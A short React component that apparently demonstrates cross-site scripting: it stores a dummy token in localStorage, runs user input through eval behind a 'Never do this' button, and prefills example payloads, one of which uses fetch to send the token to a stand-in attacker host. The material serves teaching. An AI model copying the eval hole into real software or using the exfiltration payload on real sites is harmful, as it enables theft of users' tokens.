import React, { Component } from 'react';
import 'whatwg-fetch';

class LocalStorageFetch extends Component {

  constructor() {
    super();

    this.state = {
      link: ``
    }
  }

  componentDidMount() {
    console.log("Storing token in localStorage....");
    localStorage.access_token = "super_secret_token";
  }

  neverDoThis = () => {
    eval(this.state.link); //<-NEVER DO THIS
  }

  render() {
    return (
      <div>
        <h2>Accessing <i>localStorage</i> via injecting URLs</h2>
        <pre>Token "super_secret_token" stored in localStorage.access_token</pre>
        <label>Enter a custom string below:</label><br/>
        <input value={this.state.link}
               type='text'
               style={{width: '500px'}}
               onChange={(e) => this.setState({link: e.target.value})}/>
        <br/>
        <br/>
        <label>XSS Examples:</label><br/>
        <input defaultValue="alert('Got your token! ' + localStorage.access_token)" style={{width: 500}} /><br/>
        <input defaultValue="fetch('http://hackersrus.com/logger.php?token='+localStorage.access_token);" style={{width: 500}} />
        <hr />
        <button onClick={this.neverDoThis}>Execute User-provided Content (Never do this)</button>
      </div>
    );
  }
}

export default LocalStorageFetch;
